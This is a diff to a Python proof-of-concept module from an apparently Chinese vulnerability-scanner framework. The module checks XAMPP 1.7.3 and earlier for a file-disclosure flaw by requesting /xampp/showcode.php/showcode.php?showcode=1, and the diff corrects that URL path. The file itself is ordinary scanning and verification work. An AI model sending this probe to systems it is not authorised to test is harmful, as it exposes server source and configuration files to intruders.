@@ -11,11 +11,11 @@ class Vuln(ABVuln):
     type = VulnType.INFO_LEAK # 漏洞类型
     disclosure_date = ' 2010-11-01'  # 漏洞公布时间
     desc = '''
-        XAMPP 1.7.3 文件泄露漏
+        XAMPP 1.7.3 /xampp/showcode.php/showcode.php?showcode=1 文件泄露漏。
     ''' # 漏洞描述
     ref = 'https://www.exploit-db.com/exploits/15370/' # 漏洞来源
-    cnvd_id = '' # cnvd漏洞编号
-    cve_id = '' #cve编号
+    cnvd_id = 'Unkonwn' # cnvd漏洞编号
+    cve_id = 'Unkonwn' #cve编号
     product = 'XAMPP'  # 漏洞应用名称
     product_version = '<= 1.7.3'  # 漏洞应用版本
 
@@ -33,7 +33,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
-            url = arg + "xampp/showcode.php/showcode.php?showcode=1"
+            url = arg + "/xampp/showcode.php/showcode.php?showcode=1"
             code, head, res, errcode,finalurl =  hh.http(url)
             if res.find('file_get_contents') != -1 :
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
@@ -42,7 +42,7 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        super(Poc, self).exploit()
+        self.verify()
 
 
 if __name__ == '__main__':
